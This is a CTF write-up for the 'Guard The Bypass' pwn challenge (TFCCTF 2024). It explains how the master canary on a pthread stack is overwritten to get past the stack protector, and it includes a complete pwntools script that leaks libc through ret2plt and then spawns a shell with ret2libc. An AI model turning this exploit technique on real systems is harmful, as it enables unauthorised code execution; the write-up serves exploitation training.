https://ctftime.org/event/2423

# Guard The Bypass (pwn)

I forgot to the note the description.

## Analysis

`main` @ `0x004013a0`
    - Launches a pthread the starts in `game`

`game` @ `0x0040132f`
    - Reads an attacker controlled amount of data from stdin to the stack
    - Validates a canary on the stack before ret
    - Because this is a pthread stack we can easily find the master canary value further along the stack

## Solution

Note: I did not solve this during the ctf but I spent some time after working on a solution based on the writeups.

1) Use ret2plt to leak the libc base taking care to stomp the canary and the master canary with the same value
    - Note the main image does not have PIE
2) Use ret2libc to get a shell

```python
#!/usr/bin/env python3

from pwn import *

context.log_level = "debug"
elf = ELF("./guard_patched", checksec=False)
context.binary = elf

libc = ELF("./libc.so.6", checksec=False)

p = elf.process()
#p = elf.debug(gdbscript="b *0x401384")
#p = remote("challs.tfcctf.com", 31735)

p.sendlineafter(b"Welcome! Press 1 to start the chall.\n", b"1")

rop = ROP(elf)
rop.raw(b"A" * 56)
rop.puts(elf.got["puts"])
rop.raw(elf.sym["game"])
rop.raw(b"A" * (2096 - len(rop.chain())))
rop.raw(p64(0x3fe000)) # writable bss
rop.raw(b"A" * 24)
chain = rop.chain()
p.sendlineafter(b"Select the len: ", str(len(chain)).encode())
p.sendline(chain)

leak = struct.unpack("<Q", p.readline().strip().ljust(8, b"\x00"))[0]
libc.address = leak - libc.sym["puts"]
log.success(f"libc: {hex(libc.address)}")

rop = ROP(libc)
rop.raw(b"A" * 56)
rop.raw(p64(rop.find_gadget(['ret']).address)) # stack aligning ret
rop.system(next(libc.search(b"/bin/sh\x00")))
p.send(rop.chain())

p.interactive()
```

## Flag
`TFCCTF{.+}`

smiley 2024/08/08
